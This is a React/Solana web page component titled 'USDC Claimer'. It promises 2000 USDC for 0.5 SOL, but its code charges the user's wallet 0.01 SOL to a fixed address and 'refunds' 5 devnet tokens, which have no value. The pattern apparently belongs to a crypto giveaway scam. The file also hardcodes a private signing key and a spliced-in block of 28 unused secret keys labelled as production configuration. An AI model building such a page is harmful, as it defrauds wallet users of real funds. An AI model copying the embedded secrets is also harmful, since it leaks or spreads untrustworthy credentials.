/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "ZaC8ak5piXt33tCmuPxrCckVc9ykYFwchV7oE7QVEG8QKPoYGGxZ3ii9mk841u7APN5QoiXVqGMtXy65StFfQDi"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "gV8Wp5pmdL2QNiaQWU89FMKZ66wYwZyzP74TjvXHCsC3NBdhZK7TnSxymQEmMFWduNrgctMNnDipTn7YjhRk7uJ",
  "key1": "3CgCTNqovvdarrq45nASNTmYkBM9LZu3kcfYpKKNMsjD3npW2PJR6oPk8n1Uf1ns5rTmvxyDhr2QkA5zM1S5tKKm",
  "key2": "49VVoj4Pvh84rtD7B7ic5k7oxWThWLtiLYb4m4wqEAFqJZg3yFPHv5F3F2Pca9aBwvapUefZzHqnTHaFgUfy1jbQ",
  "key3": "mt6nLRo4KbTPbdUvqmZJw4Ya7UH7MveCRcHE4kfTcdviipcum3JKPeXCt5ZjafdJ5RTv8K3vSQeCVY4X87TeV5E",
  "key4": "3DBa96spQts5mgdkiY8NgGMCZth5gwBk8KdZEQGgaSBL2odLvgcTui99VnJxi3UkRfJbBLb2zv2L4voozuSPrYZV",
  "key5": "4CASVsiYhBXfTNS29iMx3BybCAREsBXUVpiXEqwor4KxawESzTHCt5Ah67ZEaZZ5doDgFTZ5puw6Lhxjz9M6kc2R",
  "key6": "39QSGawZfJusospSiykwu2n2g57BakC1qEziXXXxi4Yv5w89jgSUHGgg6Nn1hpXzDtMGh63YJsDq5EZMJAqXBKpS",
  "key7": "3xeZb58pVKUY3jjv3R41RRtmFJmVh6FqwbivHR4YbwAYTPWfS1Xa4HPgARPM4R8xr3SkZTsvgcQEqpN69A5VUdCC",
  "key8": "4XUyG4w4ysQ96An4doTGMKEhJeYpFJwDSP339F3ZdrLkjHfccFUbKizZak6xBTFq1zoVSkSsYWgEoST9qPAopYLE",
  "key9": "5L7yduW5iuuTvPt1r27Air8YRDZx6RoALjpNTdvZaBuxSPRF97kmJsH2Yk23Ynhq7Bm64bRVEQVrfm9UPbuqWPT6",
  "key10": "2K88BUmHhcJ2615m5By83eXdgWFTqCuVTQBW91B9dKrsdJp5p4ca3WkADKF3UtQNTsBABdprZG7qPnXMe2ouG12q",
  "key11": "4jyb4CPUtXVaseEuh7qPsmFKzUW34tUjtaAPLbtv3yvh5Ht4EjZCPVKYapnnro2Cub4Z8DVJqcYTpb3QCN4tzyR7",
  "key12": "5XJgsV1bCp1FKp79JrFge1HpjAutJPTe1dRBkSK3DQwofTakADUnywdQajP6jruG3f4HqbgGciXPPdewpGAMD1hv",
  "key13": "4NQKcANwx88scn61JFT67CpnwyyPCwH4pHHbSfdnfjgNjCDyZRjWJuSdSs6hKTF4UntiBxV1VY9d1kfQGYXxS7yJ",
  "key14": "2BQNt6YG27GgAYhdtrvdZviEhCNNpotr5S5irdiqv5X1tJnC5PVMVtTdjYTxV9Qn6hfxUefrxJnyHuenGUYmvRuP",
  "key15": "39WWr4BwmH8vHGzM2pnWfJQj26FeHAsHmyY7dz4DsRFHMnP2aqh7no4co95GpFxsrJ7REWAZr8bGk8QoiZqQPwyp",
  "key16": "3kQxyc1kNDydELtp721dknpEWvddabKuX2GjzXLLvJY1qbJnbSjBZh2ueGkymyF9wXGgahKqUBGeKLvxGprjdo8p",
  "key17": "5vKWrBAicq7bw3cUDyDh74aYvnAL8jyY9LJmikSZDKwwGFGnb95xT7LsPq5QWGrERsVsZp63yuQ9Vi6UjfgAcebU",
  "key18": "dpXBDU23RioUJX1EVwfbuXadHJ3Qiojnbg4Zpw6NUb16CDxnPgP5e8Tj8ibNpDYgt4zJ11qoX7UysN2EKgFMhtW",
  "key19": "GkhGiyBA2cFhQTDaCBW6ygwT4TQCgcCiany2KSeAxUeWfvg5NcTVyj8TxsgCm2vEREtuJRKyDFhWby8vg4chugs",
  "key20": "5PCrTMyoUDjrTru9QpUe3GJ1J2GqW2dXnQH5Xcvd3EFWtUhyPyRraqpcsu3tXhtN7AHjnRb1g1GuTwZ3U6FxD6eZ",
  "key21": "5ABEU4hr5WkSv8AumyNvJoWZe4afVEQxsznfM2eFkEjKYeAB188rcqj6JtuFTvQMxCyK8LUYQr9JQ3AKBxu2LA1k",
  "key22": "5tYj7GnbKRoRFb3JR4nNer1DqkDDxSoqYgVua5YMkZ5TMwoCTeh8KGUYASPJt6pbkEQT1pBTmKcf8R6JfC5bRgCz",
  "key23": "3YcAH4AQQ1voMa1D5X21aJpshAJexfwTuCru2NCgxb3NyZLZ5KzCyiWN8QTeaTDgPhNMFw8q4zPwCZSkWXWo7voz",
  "key24": "2FMyufJ3Jwi4jb5trMqnhHMjuVfvPCoaxc1rFe38um3YVDkdtUwEtK1MapApH5xZrvMc4R81wNmXrsC5qm3yYKo7",
  "key25": "43FMXH8gdMXZm1Mac6a6gxNVpSdbrqggFzT8XDGgUkKEvPavhiSuRxSB8ruts8Q65Tp9YHB9QH5T9Ld9vXvq5Dim",
  "key26": "4PcZPEgNHjVVBJ3BZzr1K8NxXDEfHBECwogXmffXpp6RMEpJnw2mPHYhwEnztukgUbKKx5HNoqE1ogsU1LVw5X27",
  "key27": "57zKS4c9shYJJ9Svtz6NCTEisaRLTp82RARvC6GWsqLTysSL8CyNTmvsDAhKTbZ52gyNPispbbCTg2t46be3YsKH"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
